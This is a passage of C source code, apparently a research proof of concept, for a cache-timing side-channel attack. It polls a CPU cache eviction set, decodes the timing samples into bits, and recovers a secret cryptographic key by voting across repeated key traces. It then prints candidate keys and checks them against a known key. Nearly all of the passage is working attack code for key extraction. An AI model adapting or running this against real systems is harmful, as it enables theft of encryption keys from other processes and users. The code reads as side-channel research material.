			TimeSpent = (qword)(end.tv_nsec - start.tv_nsec) + (qword)(end.tv_sec - start.tv_sec) * 1000000000;
		} while (TimeSpent < CACHE_POLL_TIMEOUT_IN_NANO - CACHE_POLL_TIME_SAMPLE_DELAY);

		PRINTF("Time probing cache: %ld ns, sleeping %ld ns.\n", elapsedTime, TimeSpent);
	}

	return DataRead;
}

char* PollForDataBits(Cache_Set* pSet, uint64_t BitsToRead)
{
	char* DataRead = malloc(sizeof(char) * BitsToRead + 1);
	int Sample;
	struct timespec start, end;
	qword TimeSpent;
	int Miss;
	clock_gettime(CLOCK_REALTIME, &start);

	for (Sample = 0; Sample < BitsToRead; Sample++)
	{
		clock_gettime(CLOCK_REALTIME, &start);

		Miss = PollAsm(pSet->Lines[0], pSet->ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);

		DataRead[Sample] = (Miss > 0);

		do {
			clock_gettime(CLOCK_REALTIME, &end);
			TimeSpent = (qword)(end.tv_nsec - start.tv_nsec) + (qword)(end.tv_sec - start.tv_sec) * 1000000000;
		} while (TimeSpent < CACHE_POLL_TIMEOUT_IN_NANO - CACHE_POLL_TIME_SAMPLE_DELAY);

		PRINTF("Time probing cache: %ld ns, sleeping %ld ns.\n", elapsedTime, TimeSpent);
	}

	DataRead[Sample] = 0;

	return DataRead;
}

/*
int ValidateSet(char* Set, int SetSize)
{
	int j;
	char* pCurrLine = Set;
	char* pLastLine;

	for (j = 0; j < SetSize - 1; j++)
	{
		pLastLine = pCurrLine;
		pCurrLine = *(char**)pCurrLine;
		//printf("Line %x\r\n", (unsigned int)pCurrLine);
	}

	int x = (pCurrLine == 0);

	if (x == 1)
	{
		int y = 20;
	}
	return x;
}
*/

char* SamplesToDataBitsArray(char* Samples, char OnesPattern[], char ZerosPattern[], int PatternBitsNum,
		int SamplesNum, int WriteToFile, char* pFileName, int* pScore, int* pFoundBitsNum)
{
	int CurrSample = 0;
	int Score = 0;
	int bit, i;
	int WrongBits;
	int OnesFound = 0;
	int ZerosFound = 0;
	int ForwardSteps = 1;
	int Step;
	int MaxWrongBits = MAX_WRONG_ZEROS;
	int* ZerosIndexes = malloc(sizeof(int) * SamplesNum / PatternBitsNum);
	int* OnesIndexes = malloc(sizeof(int) * SamplesNum / PatternBitsNum);
	int CurrOne;
	FILE* pFile;
	int DataLen = SamplesNum / PatternBitsNum + 1;
	char* ReadData = malloc(DataLen);

	if (WriteToFile)
	{
		char* TmpSamples = malloc(SamplesNum + 1);
		memcpy(TmpSamples, Samples, SamplesNum);

		for (i = 0; i < SamplesNum; i++)
		{
			TmpSamples[i] += '0';
		}

		TmpSamples[SamplesNum] = 0;
		// If too many samples to easily read, only print the first 50k
		if (SamplesNum > 50000)
			TmpSamples[50000] = 0;

		pFile = fopen(pFileName, "wr");
		fprintf(pFile, "Samples:\r\n");

		int Line = 0;
		for (Line = 0; Line < strlen(TmpSamples); Line += 100)
		{
			fprintf(pFile, "%.100s\r\n", TmpSamples + Line);
		}

		free(TmpSamples);
	}

	int ConsecutiveZeroes = 0;
	int Interruptions = 0;

	// For starters, make sure we do not confuse non-encryption areas with encryption areas.
	/*
	while (CurrSample < SamplesNum)
	{
		// Find groups of continous zeroes
		if (*(Samples + CurrSample) == 0)
		{
			ConsecutiveZeroes++;
		}
		else if (ConsecutiveZeroes != 0)
		{
			// Enough consecutive zeroes found, annialate them!
			if (Interruptions >= 1 && ConsecutiveZeroes >= PatternBitsNum * 2)
			{
				memset(Samples + CurrSample - ConsecutiveZeroes - Interruptions, BAD_BIT, ConsecutiveZeroes);
			}

			if (Interruptions >= 1)
			{
				ConsecutiveZeroes = 0;
				Interruptions = 0;
			} else
			{
				Interruptions++;
			}
		}

		CurrSample++;
	}

	// Enough consecutive zeroes found, annialate them!
	if (ConsecutiveZeroes >= PatternBitsNum * 2)
	{
		memset(Samples + CurrSample - ConsecutiveZeroes - Interruptions, BAD_BIT, ConsecutiveZeroes);
	}
*/

	MaxWrongBits = MAX_WRONG_ONES;
	CurrSample = 0;

	// First find the ones, since they are easier to differentiate.
	while (CurrSample + PatternBitsNum < SamplesNum)
	{
		int BestResult = MaxWrongBits + 1;
		int BestStep = 0;

		for (Step = 0; Step <= ForwardSteps; Step++)
		{
			WrongBits = 0;

			// Check we aren't over the array bounds.
			if (CurrSample + PatternBitsNum + Step >= SamplesNum)
			{
				break;
			}

			// Compare the first n bits with the patterns
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				WrongBits += (*(Samples + CurrSample + bit + Step) != *(OnesPattern + bit));
			}

			// If the result is decent, compare it with the next few bits to
			// see if we can get an even better pattern.
			if (WrongBits < BestResult)
			{
				BestResult = WrongBits;
				BestStep = Step;
			}
			// If the result is bad, just skip to the next bit
			else
			{
				break;
			}
		}

		// If we found a zero pattern, zero all relevant samples to make sure they aren't used later for 1's
		if (BestResult <= MaxWrongBits)
		{
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				*(Samples + CurrSample + BestStep + bit) = 0xf;
			}

			OnesIndexes[OnesFound++] = CurrSample + BestStep;
			Score += (MaxWrongBits - BestResult) + POINTS_PER_ONE_BIT;
			CurrSample += PatternBitsNum + BestStep + 1;
		}
		else
		{
			CurrSample++;
		}
	}

	CurrSample = 0;
	ForwardSteps = 1;
	CurrOne = 0;
	MaxWrongBits = MAX_WRONG_ZEROS;

	// Now we try to find all the zeroes
	while (CurrSample + PatternBitsNum < SamplesNum)
	{
		int BestResult = MaxWrongBits + 1;
		int BestStep = 0;


		if (CurrOne < OnesFound && CurrSample > OnesIndexes[CurrOne])
			CurrOne++;

		if (CurrOne < OnesFound && CurrSample == OnesIndexes[CurrOne])
			CurrSample += PatternBitsNum;

		for (Step = 0; Step <= ForwardSteps; Step++)
		{
			WrongBits = 0;

			// Check we aren't over the array bounds.
			if (CurrSample + PatternBitsNum + Step >= SamplesNum)
			{
				break;
			}

			// Compare the first n bits with the patterns
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				WrongBits += ((*(Samples + CurrSample + bit + Step) != *(ZerosPattern + bit)) ? 1 : 0);
			}

			// If the result is decent, compare it with the next few bits to
			// see if we can get an even better pattern.
			if (WrongBits < BestResult)
			{
				BestResult = WrongBits;
				BestStep = Step;
			}
			// If the result is bad, just skip to the next bit
			else
			{
				break;
			}
		}

		// If we found a zero pattern, zero all relevant samples to make sure they aren't used later for 1's
		if (BestResult <= MaxWrongBits)
		{
			for (bit = 0; bit < PatternBitsNum; bit++)
			{
				*(Samples + CurrSample + BestStep + bit) = 0xe;
			}

			ZerosIndexes[ZerosFound++] = CurrSample + BestStep;
			Score += (MaxWrongBits - BestResult) + POINTS_PER_ZERO_BIT;
			CurrSample += PatternBitsNum + BestStep;
		}
		else
		{
			CurrSample++;
		}
	}

	/*
	if (OnesFound > ZerosFound * 4)
		Score = 0;

	if (ZerosFound > OnesFound * 4)
		Score = 0;
*/
	if (pScore != NULL)
		*pScore = Score;

	int CurrOnesIdx = 0;
	int CurrZeroIdx = 0;
	int LastIndex = -1;
	int LastBitEnd = 0;
	int BadBitsNum = 0;

	if (WriteToFile)
		fprintf(pFile, "Indexes:\r\n");

	while (CurrOnesIdx < OnesFound && CurrZeroIdx < ZerosFound)
	{
		if (ZerosIndexes[CurrZeroIdx] < OnesIndexes[CurrOnesIdx])
		{
			/*
			if (WriteToFile) {
				for (i = 0; i + LastIndex < ZerosIndexes[CurrZeroIdx] - 1; i++)
				{
					fprintf(pFile, " ");
				}
				fprintf(pFile, "0");
			}
			*/

			LastIndex = ZerosIndexes[CurrZeroIdx];

			// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
			while (LastBitEnd + PatternBitsNum < LastIndex)
			{

				ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
				BadBitsNum++;
				LastBitEnd += PatternBitsNum + 1;
			}

			LastBitEnd = LastIndex + PatternBitsNum;
			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '0';
			CurrZeroIdx++;
		} else
		{
			/*
			if (WriteToFile) {
				for (i = 0; i + LastIndex < OnesIndexes[CurrOnesIdx] - 1; i++)
				{
					fprintf(pFile, " ");
				}
				fprintf(pFile, "1");
			}
			*/

			LastIndex = OnesIndexes[CurrOnesIdx];

			// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
			while (LastBitEnd + PatternBitsNum < LastIndex)
			{

				ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
				BadBitsNum++;
				LastBitEnd += PatternBitsNum + 1;
			}

			LastBitEnd = LastIndex + PatternBitsNum;
			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '1';
			CurrOnesIdx++;
		}
	}

	// Either we finished going over the ones or zeros, so fill the rest of the bits accordingly.
	while (CurrOnesIdx < OnesFound)
	{
		LastIndex = OnesIndexes[CurrOnesIdx];

		// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
		while (LastBitEnd + PatternBitsNum < LastIndex)
		{

			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
			BadBitsNum++;
			LastBitEnd += PatternBitsNum + 1;
		}

		LastBitEnd = LastIndex + PatternBitsNum;

		ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '1';
		CurrOnesIdx++;
	}

	while (CurrZeroIdx < ZerosFound)
	{
		LastIndex = ZerosIndexes[CurrZeroIdx];

		// If the difference between the last identified bit and the new one is longer then the pattern size, fill with '?'s
		while (LastBitEnd + PatternBitsNum < LastIndex)
		{

			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
			BadBitsNum++;
			LastBitEnd += PatternBitsNum + 1;
		}

		LastBitEnd = LastIndex + PatternBitsNum;

		ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '0';
		CurrZeroIdx++;
	}

	// End of string, for printing to screen.
	ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = 0;

	if (pFoundBitsNum != NULL)
		*pFoundBitsNum = CurrOnesIdx + CurrZeroIdx + BadBitsNum;

	if (WriteToFile)
	{
		for (i = 0; i < SamplesNum; i++)
		{
			Samples[i] += '0';
		}

		Samples[SamplesNum] = 0;

		//fprintf(pFile, "\r\nModified:\r\n%s\r\n", Samples);
		fprintf(pFile, "Key:\r\n%s\r\n", ReadData);
		fclose(pFile);
	}

	free(ZerosIndexes);
	free(OnesIndexes);
	return ReadData;
}

int RatePatternsInSet(Cache_Set* pSet, int SetIdx, char OnesPattern[], char ZerosPattern[], int PatternBitsNum, int SamplesNum)
{
	char* Samples = PollForDataBits(pSet, SamplesNum);
	int Score;
	char FileName[100];
	char* ReadData;

	sprintf(FileName, "Set_%d_Samples.txt", SetIdx);

	ReadData = SamplesToDataBitsArray(Samples, OnesPattern, ZerosPattern, PatternBitsNum, SamplesNum, 1, FileName, &Score, NULL);

	free(ReadData);
	free(Samples);
	return Score;
}

char* ExtractKeyFromSet(Cache_Set* pSet, char OnesPattern[], char ZerosPattern[], int PatternBitsNum)
{
	int SamplesNum = MAX_SAMPLES_PER_BIT * KEYS_LEN_IN_BITS * NUMBER_OF_KEYS_TO_SAMPLE;
	char* Samples = PollForDataBits(pSet, SamplesNum);
	char SampledKeys[NUMBER_OF_KEYS_TO_SAMPLE][KEYS_LEN_IN_BITS + MAX_HANDLED_EXTRA_BITS];
	int SampledKeysLengths[NUMBER_OF_KEYS_TO_SAMPLE];
	int Bit, KeyBit;
	int BitsFound;
	int CurrKey = 0;
	int KeysFound = 0;

	// First turn the samples into actual bits of data
	char* pData = SamplesToDataBitsArray(Samples, OnesPattern, ZerosPattern, PatternBitsNum, SamplesNum, 1, "KeySamplesFile.txt", NULL, &BitsFound);
	memset(SampledKeys, '?', sizeof(SampledKeys));

	// Now that we have the bits, we need to identify different keys in the data so we can compare them later.
	Bit = 0;
	while (Bit + 5 < BitsFound && CurrKey < NUMBER_OF_KEYS_TO_SAMPLE)
	{
		// the start of a new key will be identified by at least 3 unidentified bits, followed by 3 identified bits
		if (pData[Bit] == '?' && pData[Bit + 1] == '?' && pData[Bit + 2] == '?' &&
			pData[Bit + 3] != '?' && pData[Bit + 4] != '?' && pData[Bit + 5] != '?')
		{
			Bit += 3;

			// We found the start of a key, copy it until we run into three unidentified bits again, or we run out of space.
			for (KeyBit = 0; KeyBit < KEYS_LEN_IN_BITS + MAX_HANDLED_EXTRA_BITS; KeyBit++)
			{
				// If this is the end of the key, stop
				if (pData[Bit + KeyBit] == '?' && pData[Bit + KeyBit + 1] == '?' && pData[Bit + KeyBit + 2] == '?')
					break;

				SampledKeys[CurrKey][KeyBit] = pData[Bit + KeyBit];
			}

			Bit += KeyBit;
			SampledKeysLengths[CurrKey] = KeyBit;
			CurrKey++;
		}
		else
		{
			Bit++;
		}
	}

	// Ok we parsed all the keys, now lets do some statistics on it to find the real key.
	char* pRealKeyBits = malloc(KEYS_LEN_IN_BITS);
	char* pRealKey = malloc(KEYS_LEN_IN_BITS / BITS_IN_CHAR);
	memset(pRealKey, 0, KEYS_LEN_IN_BITS / BITS_IN_CHAR);
	memset(pRealKeyBits, 0, KEYS_LEN_IN_BITS);
	KeysFound = CurrKey;

	/*
	// We go over all keys and look for matching subsections
	for (CurrKey = 0; CurrKey < KeysFound; CurrKey++)
	{
		for (SecondKey = 0; SecondKey < KeysFound; SecondKey++)
		{
			int MatchScore = 0;
			int BestScore = 0;
			int BestScoreEndIndex;

			for (KeyBit = 0; KeyBit < KEYS_LEN_IN_BITS; KeyBit++)
			{
				// If the 2 keys don't start the same way, not much point in doing this.
				if (MatchScore < 0)
					break;

				MatchScore += (SampledKeys[CurrKey][KeyBit] == SampledKeys[SecondKey][KeyBit]) ? 1 : -1;
			}
		}
	}
	*/

	int KeySkipIndex[NUMBER_OF_KEYS_TO_SAMPLE];
	int AreKeysUnsynched[NUMBER_OF_KEYS_TO_SAMPLE];
	memset(KeySkipIndex, 0, sizeof(KeySkipIndex));
	memset(AreKeysUnsynched, 0, sizeof(AreKeysUnsynched));
	int BitChunks, ByteInKey, BitInChunk;
	int SkippedBitAverage = 0;
	int FinalSkippedBitAverage = 0;
	int SkippedBitCount = 0;
	int ValidKeys = 0;

	// Lets start by syncing the beggining of the keys
	for (CurrKey = 0; CurrKey < KeysFound; CurrKey++)
	{
		while (SampledKeys[CurrKey][KeySkipIndex[CurrKey]] != '1' &&
				KeySkipIndex[CurrKey] < SampledKeysLengths[CurrKey] &&
				SampledKeysLengths[CurrKey] >= (KEYS_LEN_IN_BITS - MAX_MISSING_BITS))
		{
			KeySkipIndex[CurrKey]++;
		}

		SkippedBitCount += KeySkipIndex[CurrKey];
		ValidKeys += (SampledKeysLengths[CurrKey] >= (KEYS_LEN_IN_BITS - MAX_MISSING_BITS));
	}
	if (ValidKeys == 0){			//if no more valid keys
		free (pRealKeyBits);
		free (Samples);
		free (pRealKey);
		free(pData);
		return NULL;
	}
	SkippedBitAverage /= ValidKeys;

	SkippedBitAverage = SkippedBitCount / ValidKeys;
	SkippedBitAverage += ((((float)SkippedBitCount) / ValidKeys) - (float)SkippedBitAverage > 0.5);

	int ErrorsInChunks[KEYS_LEN_IN_BITS / BITS_IN_CHUNK];
	memset(ErrorsInChunks, 0, sizeof(ErrorsInChunks));

	for (BitChunks = 0; BitChunks < KEYS_LEN_IN_BITS / BITS_IN_CHUNK; BitChunks++)
	{
		for (BitInChunk = 0; BitInChunk < BITS_IN_CHUNK; BitInChunk++)
		{
			int OnesAndZeroesBalance = 0;
			KeyBit = BitChunks * BITS_IN_CHUNK + BitInChunk;
			ByteInKey = BitChunks * (BITS_IN_CHUNK / BITS_IN_CHAR);

			// Go over all the bits in the same index and check if there are more 0's or 1's
			for (CurrKey = 0; CurrKey < KeysFound; CurrKey++)
			{
				if (SampledKeysLengths[CurrKey] < (KEYS_LEN_IN_BITS - MAX_MISSING_BITS) ||
					SampledKeys[CurrKey][KeyBit + KeySkipIndex[CurrKey]] == '?' ||
					AreKeysUnsynched[CurrKey])
				{
					continue;
				}

				OnesAndZeroesBalance += ((SampledKeys[CurrKey][KeyBit + KeySkipIndex[CurrKey]] == '1') ? 1 : -1);
			}

			pRealKeyBits[KeyBit] = ((OnesAndZeroesBalance >= 0) ? '1' : '0');

			// If there was no clear winner, mark it as an unknown bit.
			if ((OnesAndZeroesBalance <= 1 && OnesAndZeroesBalance >= -1))
				pRealKeyBits[KeyBit] = '?';
		}

		// We have determined the first byte, now find out which keys failed to match and why.
		// Go over all the bits in the same index and check if there are more 0's or 1's
		for (CurrKey = 0; CurrKey < KeysFound; CurrKey++)
		{
			int WrongBits = 0;

			// Ignore keys which are too short
			if (SampledKeysLengths[CurrKey] < (KEYS_LEN_IN_BITS - MAX_MISSING_BITS))
				continue;

			// Check how many bits are bad for this key.
			for (BitInChunk = 0; BitInChunk < BITS_IN_CHUNK; BitInChunk++)
			{
				KeyBit = BitChunks * BITS_IN_CHUNK + BitInChunk;
				WrongBits += (SampledKeys[CurrKey][KeyBit + KeySkipIndex[CurrKey]] != pRealKeyBits[KeyBit]);
			}

			// If there is only one or 2 mistakes, it could be a switched bit, ignore it.
			if (WrongBits >= 3)
			{
				int BitShift = 0;
				int InsertedBit = 0;
				int BestResult = 10;
				int BestShift = 0;

				// If we are in the first byte, cannot shift backwards.
				if (ByteInKey == 0)
					BitShift = 0;

				// Try and see if there would be less mistakes if we shift a few bits backwards or forwards
				while (WrongBits >= 3 && BitShift <= 3 && BitShift >= -3)
				{
					// First thing first, try seeing if inserting a bit in any one position solves the problem.
					for (InsertedBit = 0; InsertedBit < BITS_IN_CHUNK; InsertedBit++)
					{
						int fSkippedBit = 0;
						WrongBits = 0;

						// We assume there is a new bit in InsertedBit position, and check if the problem get fixed.
						for (BitInChunk = 0; BitInChunk < BITS_IN_CHUNK - 1; BitInChunk++)
						{
							// If we get to the inserted bit position, skip it.
							if (BitInChunk == InsertedBit)
								fSkippedBit = 1;

							KeyBit = BitChunks * BITS_IN_CHUNK + BitInChunk;
							WrongBits += (SampledKeys[CurrKey][KeyBit + KeySkipIndex[CurrKey] + BitShift] != pRealKeyBits[KeyBit + fSkippedBit]);
						}

						// If the problems were solved, update the shift counters
						if (WrongBits <= 1 && WrongBits <= BestResult)
						{
							BestResult = WrongBits;
							BestShift = BitShift - (InsertedBit < BITS_IN_CHUNK);

							if (BestResult == 0)
								break;
						}
					}

					// If the problems were solved, update the shift counters
					if (BestResult == 0)
						break;

					// We start from bitShift == 0, go up to 3, then -1 to -3.
					if (BitShift >= 0 && BitShift < 3)
						BitShift++;
					else if (BitShift == 3)
						BitShift = -1;
					else
						BitShift--;
				}

				// If problems still there, mark key so its not counted in vote next time.
				if (BestResult <= 1)
				{
					if (InsertedBit == BITS_IN_CHUNK && (BitChunks > 0))
						ErrorsInChunks[BitChunks - 1]++;
					else
						ErrorsInChunks[BitChunks]++;

					KeySkipIndex[CurrKey] += BestShift;
					AreKeysUnsynched[CurrKey] = 0;
				} else {
					AreKeysUnsynched[CurrKey] = 1;
				}
			}
		}
	}

	// Now print the found key
	printf("First possible key:\r\n0x");

	// We always miss the first 1 bit and any zeroes before it.
	// So check how many bits are we missing and padd with zeroes and 1's instead
	int MissingBits = 0;
	for (Bit = 0; Bit < KEYS_LEN_IN_BITS; Bit++)
	{
		if (pRealKeyBits[KEYS_LEN_IN_BITS - Bit - 1] == '?')
		{
			MissingBits++;
		}
		else
		{
			break;
		}
	}

	// Save some space for the zero bits we skipped at the start.
	FinalSkippedBitAverage = ((MissingBits >= SkippedBitAverage) ? SkippedBitAverage : MissingBits);
	pRealKey[(MissingBits - FinalSkippedBitAverage) / 8] |= (1 << (BITS_IN_CHAR - 1 - ((MissingBits - FinalSkippedBitAverage - 1) % BITS_IN_CHAR)));

	for (Bit = 0; Bit < KEYS_LEN_IN_BITS; Bit++)
	{
		pRealKey[(Bit + MissingBits) / 8] |= ((pRealKeyBits[Bit] == '1') << (BITS_IN_CHAR - 1 - ((Bit + MissingBits) % BITS_IN_CHAR)));
	}

	for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
	{
		printf("%08x", htonl(((int*)pRealKey)[ByteInKey]));
	}

	printf("\r\n");

	// Now compare it to the real key.
	char* TmpKey = StringToBuff(RealKey);

	int Equal = memcmp(pRealKey, TmpKey, KEYS_LEN_IN_BITS / BITS_IN_CHAR);

	if (Equal != 0)
	{
		printf("The key is WRONG!\r\n");

		printf("Second possible key:\r\n0x");
		memset(pRealKey, 0, KEYS_LEN_IN_BITS / BITS_IN_CHAR);

		FinalSkippedBitAverage = ((MissingBits >= SkippedBitAverage - 1) ? SkippedBitAverage - 1 : MissingBits);
			pRealKey[(MissingBits - FinalSkippedBitAverage) / 8] |= (1 << (BITS_IN_CHAR - 1 - ((MissingBits - FinalSkippedBitAverage - 1) % BITS_IN_CHAR)));

		for (Bit = 0; Bit < KEYS_LEN_IN_BITS; Bit++)
		{
			pRealKey[(Bit + MissingBits) / 8] |= ((pRealKeyBits[Bit] == '1') << (BITS_IN_CHAR - 1 - ((Bit + MissingBits) % BITS_IN_CHAR)));
		}

		for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
		{
			printf("%08x", htonl(((int*)pRealKey)[ByteInKey]));
		}

		Equal = memcmp(pRealKey, TmpKey, KEYS_LEN_IN_BITS / BITS_IN_CHAR);

		printf("\r\n");
	}

	if (Equal != 0)
	{
		printf("The key is WRONG!\r\n");

		printf("Third possible key:\r\n0x");
		memset(pRealKey, 0, KEYS_LEN_IN_BITS / BITS_IN_CHAR);
		MissingBits++;

		FinalSkippedBitAverage = ((MissingBits >= SkippedBitAverage) ? SkippedBitAverage : MissingBits);
		pRealKey[(MissingBits - FinalSkippedBitAverage) / 8] |= (1 << (BITS_IN_CHAR - 1 - ((MissingBits - FinalSkippedBitAverage - 1) % BITS_IN_CHAR)));

		for (Bit = 0; Bit < KEYS_LEN_IN_BITS; Bit++)
		{
			pRealKey[(Bit + MissingBits) / 8] |= ((pRealKeyBits[Bit] == '1') << (BITS_IN_CHAR - 1 - ((Bit + MissingBits) % BITS_IN_CHAR)));
		}

		for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
		{
			printf("%08x", htonl(((int*)pRealKey)[ByteInKey]));
		}

		Equal = memcmp(pRealKey, TmpKey, KEYS_LEN_IN_BITS / BITS_IN_CHAR);

		printf("\r\n");
	}

	if (Equal != 0)
	{
		printf("The key is WRONG!\r\n");

		printf("Fourth possible key:\r\n0x");
		memset(pRealKey, 0, KEYS_LEN_IN_BITS / BITS_IN_CHAR);

		FinalSkippedBitAverage = ((MissingBits >= SkippedBitAverage - 1) ? SkippedBitAverage - 1 : MissingBits);
		pRealKey[(MissingBits - FinalSkippedBitAverage) / 8] |= (1 << (BITS_IN_CHAR - 1 - ((MissingBits - FinalSkippedBitAverage - 1) % BITS_IN_CHAR)));

		for (Bit = 0; Bit < KEYS_LEN_IN_BITS; Bit++)
		{
			pRealKey[(Bit + MissingBits) / 8] |= ((pRealKeyBits[Bit] == '1') << (BITS_IN_CHAR - 1 - ((Bit + MissingBits) % BITS_IN_CHAR)));
		}

		for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
		{
			printf("%08x", htonl(((int*)pRealKey)[ByteInKey]));
		}

		Equal = memcmp(pRealKey, TmpKey, KEYS_LEN_IN_BITS / BITS_IN_CHAR);

		printf("\r\n");
	}

	if (Equal == 0)
		printf("The key is CORRECT!\r\n");
	else
		printf("The key is WRONG!\r\n");

/*
	printf("\r\n");

	double ErrorPerChunkMean = 0;
	double ErrorPerChunkVariance = 0;

	// Calculate Mean
	for (BitChunks = 0; BitChunks < KEYS_LEN_IN_BITS / BITS_IN_CHUNK; BitChunks++)
	{
		ErrorPerChunkMean += ErrorsInChunks[BitChunks];
	}

	ErrorPerChunkMean /= KEYS_LEN_IN_BITS / BITS_IN_CHUNK;

	// Calculate Variance
	for (BitChunks = 0; BitChunks < KEYS_LEN_IN_BITS / BITS_IN_CHUNK; BitChunks++)
	{
		ErrorPerChunkVariance += (ErrorsInChunks[BitChunks] - ErrorPerChunkMean) *
				(ErrorsInChunks[BitChunks] - ErrorPerChunkMean);
	}

	ErrorPerChunkVariance /= KEYS_LEN_IN_BITS / BITS_IN_CHUNK;

	printf("Mean errors per chunk: %f\r\n", ErrorPerChunkMean);
	printf("Variance of errors per chunk: %lf\r\n", ErrorPerChunkVariance);
*/

	free(Samples);
	free(pRealKeyBits);
	free(pData);
	free(TmpKey);
	return pRealKey;
}

char* StringToBuff(char* String)
{
	int Len = strlen(String);
	char* pBuff = malloc(Len / 2);
	int i;

	for (i = 0; i < Len; i += 2)
	{
		char tmp = 0;

		if (String[i] >= 'a' && String[i] <= 'f')
			tmp = (String[i] - 'a') + 10;
		else
			tmp = String[i] - '0';

		tmp = (tmp << 4);

		if (String[i + 1] >= 'a' && String[i + 1] <= 'f')
			tmp |= (String[i + 1] - 'a') + 10;
		else
			tmp |= String[i + 1] - '0';

		pBuff[i / 2] = tmp;
	}

	return pBuff;
}
